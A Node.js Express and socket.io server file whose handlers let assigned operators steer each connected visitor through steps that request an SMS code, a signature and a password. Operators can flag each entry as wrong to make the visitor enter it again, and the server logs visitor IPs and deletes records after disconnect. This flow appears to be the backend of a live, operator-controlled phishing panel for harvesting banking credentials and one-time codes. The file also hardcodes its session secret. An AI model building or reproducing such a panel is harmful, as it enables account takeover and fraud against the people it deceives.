require('dotenv').config({
    path: process.env.NODE_ENV === 'test' ? '.env.test' : '.env',
})

//toggled
const bodyParser = require('body-parser')
const express = require('express')

const common = require('common-js')

const cors = require('cors')
const morgan = require('morgan')
const path = require('path')
const handlebars = require('express-handlebars')
const session = require('express-session')
const flash = require('connect-flash')
const requestIp = require('request-ip')
const socketio = require('socket.io')

require('./database')

const app = express()

app.use(bodyParser.urlencoded({ extended: false }))

app.use(bodyParser.json())

const routes = require('./routes')

//app.use(requestIp.mw())

//sessão
app.use(
    session({
        secret: `SisCodePassword`,
        resave: true,
        saveUninitialized: true,
    })
)

//config
//template engine
app.engine(
    `hbs`,
    handlebars({
        defaultLayout: `main`,
        extname: '.hbs',
        helpers: {
            json: (content) => {
                return JSON.stringify(content)
            },
            ifCond: (v1, v2, options) => {
                if (v1 === v2) {
                    return options.fn(this)
                }
                return options.inverse(this)
            },
            first: (list, index, options) => {
                if (list.length) {
                    if (list[0][index]) return list[0][index]
                }
                return options.inverse(this)
            },
            contains: (list, string, options) => {
                if (list === string) {
                    return options.fn(this)
                }
                return options.inverse(this)
            },
            printArray: function (arr) {
                for (i = 0; i < arr.length; i++) {
                    //console.log(arr[i])
                }
            },
            check: (v1, options) => {
                if (v1 === true) {
                    return options.fn(this)
                }
                return options.inverse(this)
            },
            carousel: (arr) => {
                if (arr.length) {
                    return arr.map((item, key) => {
                        if (key < 1) {
                            return `<div class="carousel-item active">
                            <img src="${item.url}" class="d-block w-100" alt="...">
                        </div>`
                        } else {
                            return `<div class="carousel-item">
                            <img src="${item.url}" class="d-block w-100" alt="...">
                        </div>`
                        }
                    })
                }
            },
            dropDown: (arr) => {
                let ul = `<ul class="dropdown-menu">`
                var text = ``
                if (arr.length) {
                    for (i = 0; i < arr.length; i++) {
                        text += `
                        <li ${arr[i].child.length ? `class="dropdown-submenu"` : ``}>
                            <a href="/products/${arr[i].slug}" ${
                            arr[i].child.length ? `class="dropdown-toggle" data-toggle="dropdown"` : ``
                        }>${arr[i].name}
                        ${arr[i].child.length ? `<i class="arrow"></i>` : ``}
                        </a>
                        `

                        if (arr[i].child.length) {
                            text += `<ul class="dropdown-menu">`
                            for (b = 0; b < arr[i].child.length; b++) {
                                text += `
                                <li ${arr[i].child[b].child.length ? `class="dropdown-submenu"` : ``} >
                                    <a href="/products/${arr[i].child[b].slug}" ${
                                    arr[i].child[b].child.length ? `class="dropdown-toggle" data-toggle="dropdown"` : ``
                                }>${arr[i].child[b].name}
                                ${arr[i].child[b].child.length ? `<i class="arrow"></i>` : ``}
                                </a>
                                `

                                if (arr[i].child[b].child.length) {
                                    text += `<ul class="dropdown-menu">`
                                    for (c = 0; c < arr[i].child[b].child.length; c++) {
                                        text += `
                                        <li>
                                            <a href="/products/${arr[i].child[b].child[c].slug}">${arr[i].child[b].child[c].name}</a>
                                        </li>`
                                    }
                                    text += `</ul></li>`
                                } else {
                                    text += `</li>`
                                }
                            }
                            text += `</ul></li>`
                        } else {
                            text += `</li>`
                        }
                    }
                    ul += text

                    return (ul += `</ul>`)
                }
            },
        },
    })
)

//flash
app.use(flash())

//middleware sessions
app.use((req, res, next) => {
    res.locals.success_msg = req.flash('success_msg')
    res.locals.error_msg = req.flash('error_msg')

    next()
})

app.set(`view engine`, `hbs`)
app.set('views', path.join(__dirname, 'views'))

//Public
app.use(express.static(path.resolve(__dirname, 'public')))

//node_modules/socket.io-client/dist/socket.io.js

app.use(cors())
// app.use(express.json({ limit: '100mb' }))
// app.use(express.urlencoded({ extended: true, limit: '100mb' }))
app.use('/files', express.static(path.resolve(__dirname, '..', 'tmp', 'uploads')))
//app.use(morgan('dev'))
app.use(routes)

app.use((req, res) => {
    res.status(404).send({ url: req.originalUrl + ' not found' })
})

const server = app.listen(process.env.PORT || 3333)

const io = socketio(server)

let theIo

let clientsSocket = []
let socketsCount = 0
let socketRooms = {}
let socketsClients = {}

const { connectedUsers } = require('./connected')

app.io = io

const Client = require('./models/Client')
const Count = require('./models/Count')
const { Op } = require('sequelize')
const UserByToken = require('./middlewares/auth')

io.on('connection', async (socket) => {
    socket.on('chat message', (msg) => {
        console.log('message: ' + msg)
        io.emit('chat message', msg)
    })

    socketsClients[socket.id] = {}

    try {
        //const ipClient = socket.request.connection._peername

        const ipConverted = socket.request.connection._peername.address.replace(/\D/g, '')

        //console.log(`ip connect: `, ipClient);

        const countClient = await Count.findOne({ where: {
            ip: ipConverted
        }})

        if(!countClient) {
            await Count.create({
                value: 1,
                ip: ipConverted
            })

            
        }

        const countsExist = await Count.count()

        io.emit('countVisitors', countsExist)
    } catch (error) {
        console.log(error);
    }

    

    socket.on('start', async (client) => {
        try {
            const theClient = await Client.findByPk(client.id, { include: { association: `operator` } })

            if (theClient) {
                if (socketsClients[socket.id]) {
                    socketsClients[socket.id].nickname = theClient.user
                }

                if (socketRooms[client.id]) {
                    socket.join(theClient.id)

                    var roster = io.sockets.adapter.rooms.get(theClient.id)

                    roster.forEach(function (client) {
                        if (socketsClients[client]) console.log('Username: ' + socketsClients[client].nickname)
                    })

                    const result = await theClient.update({ status: `reconnect` })

                    io.emit('reconnectClient', result.toJSON())
                } else {
                    socketRooms[client.id] = {
                        id: client.id,
                        time: new Date(),
                    }

                    await theClient.update({ status: 'aguardando comando' })
                    socket.join(theClient.id)
                }
            }
        } catch (error) {
            console.log(error)
        }
    })

    socket.on('disconnect', async () => {
        try {
            var id = socket.id

            if (socketsClients[id] && socketsClients[id].nickname) {
                const nickname = socketsClients[id].nickname

                const client = await Client.findOne({ where: { user: nickname } })

                if (!client) return

                // const { updatedAt } = client
                // var start = new Date(updatedAt)
                // var finish = new Date()
                // var diffdates = finish - start
                // var diffmiliseconds = diffdates / 1000
                // var diffminutes = diffmiliseconds / 60

                io.emit('clientDisconnect', client)

                //console.log(`dif disconnect: `, diffminutes)

                client.update({ status: 'disconnect' })

                setTimeout(async () => {
                    const check = await Client.findByPk(client.id)

                    if (!check) return

                    const { updatedAt } = check

                    var start = new Date(updatedAt)
                    var finish = new Date()
                    var diffdates = finish - start
                    var diffmiliseconds = diffdates / 1000
                    var diffminutes = diffmiliseconds / 60

                    if (diffminutes > 1) {
                        if (check.status == 'disconnect') await client.destroy()

                        io.emit('clientDestroy', client)
                    }

                    //const dateFromDestroyStart = new Date()
                }, 180000)

                const dateFromDestroy = new Date().setMinutes(new Date().getMinutes() - 10)

                console.log(`datefromdestroy: `, dateFromDestroy)

                await Client.destroy({
                    where: {
                        updated_at: {
                            [Op.lte]: dateFromDestroy,
                        },
                    },
                })
            }
        } catch (error) {
            console.log(error)
        }
    })

    socket.on('clean', async (id) => {

        try {
            const dateFromDestroy = new Date().setMinutes(new Date().getMinutes() - 10)

            console.log(`usuário de id : `, id, `Limpou os registros`)

            const count = await Client.destroy({
                where: {
                    updated_at: {
                        [Op.lte]: dateFromDestroy,
                    },
                },
            },
            { returning: true })

            io.emit('clean', count)
        } catch (error) {
            console.log(error)
        }
        
    })

    //user
    socket.on('erroruser', async (clientID) => {
        const client = await Client.findByPk(clientID)


        if (client) {
            await client.update({ status: 'erroruser'})

            io.emit('erroruser', client)
        }
    })

    //SMS
    socket.on('sms', async (theClient) => {
        try {
            const client = await Client.findByPk(theClient)

            if (client) {
                console.log(`pediu sms para: `, client.id)

                await client.update({ status: 'online no sms'})

                io.to(client.id).emit('sms', client.toJSON())
            }
        } catch (error) {
            console.log(error)
        }
    })

    socket.on('errorsms', async (clientID) => {
        try {
            const client = await Client.findByPk(clientID)

            if (client) {

                await client.update({ status: 'errorsms'})

                io.to(client.id).emit('errorsms', client.toJSON())
            }
        } catch (error) {
            console.log(error)
        }
    })

    //Assign Client
    socket.on('assignClient', async (data) => {
        try {
            const { token, client: clientID } = data

            const { user_id } = await UserByToken(token)

            const client = await Client.findByPk(clientID)

            if (!client) return

            await client.update({ user_id })

            const clientUpdated = await Client.findByPk(clientID, { include: { association: `operator` } })

            if (socketsClients[socket.id]) {
                socketsClients[socket.id].nickname = clientUpdated.operator.name
            }

            socket.join(client.id)

            var roster = io.sockets.adapter.rooms.get(client.id)

            roster.forEach(function (client) {
                if (socketsClients[client]) console.log('Username: ' + socketsClients[client].nickname)
            })

            io.emit('assignClient', clientUpdated.toJSON())
        } catch (error) {
            console.log(`Error on assign client`, error)
        }
    })

    //Assinatura
    socket.on('sendSignature', async (clientID) => {
        const client = await Client.findByPk(clientID, { include: { association: 'operator' } })

        if (!client) return

        await client.update({ status: 'sendSignature' })

        if (client.operator) {
            io.to(client.id).emit('sendSignature', client.toJSON())
        } else {
            io.emit('newClient', client.toJSON())
        }
    })

    socket.on('errorsignature', async (clientID) => {
        const client = await Client.findByPk(clientID)

        await client.update({ status: 'errorsignature'})

        if (client) io.to(client.id).emit('errorsignature', client)
    })

    // Password
    socket.on('sendPassword', async (clientID) => {
        try {
            const client = await Client.findByPk(clientID, { include: { association: `operator` } })

            if (!client) return

            const result = await client.update({ status: 'Senha Enviada' })

            io.to(result.id).emit('sendPassword', client)
        } catch (error) {
            console.log(error)
            console.log(`Erro ao mandar senha`)
        }
    })

    socket.on('errorpassword', async (clientID) => {
        const client = await Client.findByPk(clientID)

        await client.update({status: `Aguardando senha`})

        if (client) io.to(client.id).emit('errorpassword', client)
    })

    //await
    socket.on('await', (client) => {
        io.emit('await', client)
        //io.to(client.id).emit('await', client)
    })

    //finish
    socket.on('finish', async (clientID) => {
        const client = await Client.findByPk(clientID, { include: { association: 'operator' } })

        if (!client) return

        await client.update({ status: 'finalizado' })

        const clientResume = await Client.findByPk(client.id, { include: { association: 'operator' } })

        io.emit('finish', clientResume.toJSON())
    })
})

module.exports = { connectedUsers, clientsSocket, io, theIo }
